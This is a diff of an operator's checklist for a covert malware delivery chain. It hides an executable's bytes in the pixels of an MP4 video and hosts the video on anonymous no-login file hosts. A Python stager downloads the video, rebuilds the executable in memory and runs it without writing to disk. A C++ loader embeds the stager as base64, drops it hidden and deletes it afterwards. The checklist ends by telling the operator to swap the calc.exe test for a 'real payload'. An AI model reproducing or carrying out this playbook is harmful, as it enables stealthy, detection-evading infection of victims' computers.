@@ -1,16 +1,50 @@
-pyinstaller --onefile --console --hidden-import=cv2 --hidden-import=numpy --hidden-import=cv2.VideoCapture Stager_PixelCode_To_Payload.py
+Prepare & Encode Payload
+Use built-in Windows calc.exe (C:\Windows\System32\calc.exe) as test payload
+Script: Payload_To_PixelCode_video.py
+Modules required: opencv-python, numpy
+Purpose (high-level): Convert calc.exe binary → hide bytes in RGB pixels across video frames → generate disguised MP4
+Command:
+python Payload_To_PixelCode_video.py -i calc.exe -o Pixel_Code_Video.mp4
+Expected: Large noisy MP4 file (~tens to hundreds MB)
 
-python -m PyInstaller --onefile --noconsole ^
---collect-all imageio ^
---collect-all moviepy ^
-Stager_PixelCode_To_Payload.py
+Host the Encoded Video
+Upload Pixel_Code_Video.mp4 to anonymous no-login host
+Recommended: filebin.net (drag-drop, direct link, auto-delete after 6 days)
+Get raw/direct download URL (test in browser: should download MP4 immediately, no preview/login)
+Alternative if filebin fails: file.kiwi (unlimited size), file.io (up to 4GB)
 
-python -m PyInstaller --onefile --noconsole --hidden-import=cv2 --hidden-import=numpy --hidden-import=cv2.VideoCapture --collect-all imageio --collect-all moviepy Stager_PixelCode_To_Payload.py
+Prepare & Compile Stager
+Script: Stager_PixelCode_To_Payload.py
+Modules required: opencv-python, numpy
+Purpose (high-level): Download/open MP4 → extract bytes from pixel colors frame-by-frame → reconstruct original exe in memory → execute it (no disk write)
+Compile to standalone .exe:
+pyinstaller --onefile --console Stager_PixelCode_To_Payload.py
+Quick standalone test:
+Put MP4 + new Stager_PixelCode_To_Payload.exe in same folder → run exe → calc should appear
+
+Prepare Loader.cpp
+Update two placeholders:
+a. Video URL:
+const std::wstring url = L"https://filebin.net/your-id-here";
+b. Stager base64:
+Generate clean base64 (no headers/newlines):
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("Stager_PixelCode_To_Payload.exe")) | Set-Clipboard
+Paste into:
+const std::string base64_data = R"([Ctrl+V here])";
+Libs required: winhttp, crypt32, shell32, shlwapi
+Purpose (high-level): Download MP4 → decode base64 → drop temp stager.exe → run it hidden → delete temp → stager does pixel decode & payload exec
+Compile:
+g++ Loader.cpp -o Loader.exe -municode -static -s -lwinhttp -lcrypt32 -lshell32 -lshlwapi
+(use MSYS2 UCRT64 terminal for clean GCC)
 
 
-powershell -command "(Get-Content stager.b64 -Raw) -replace \"`r`n|`n|`r\", \"\" | Set-Content clean.txt"
+Ready to Execute Checklist
 
+ MP4 created & hosted (direct URL tested)
+ Stager.exe compiled & standalone test passed (calc pops)
+ Loader.cpp updated with URL + base64
+ Loader.exe compiled successfully
+ VM snapshot taken
 
-(Get-Content stager.b64 -Raw) -replace '(?s)-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----|\r?\n', '' -replace '\s+', '' | Set-Clipboard
-
-(Get-Content .\stager.b64 -Raw -ErrorAction Stop) -replace '(?s)-----BEGIN CERTIFICATE-----.*-----END CERTIFICATE-----|\r?\n|\s+', '' | Set-Clipboard
+After this pre-plan → run Loader.exe → expect calc popup in memory.
+If all good → replace calc.exe with real payload & repeat.
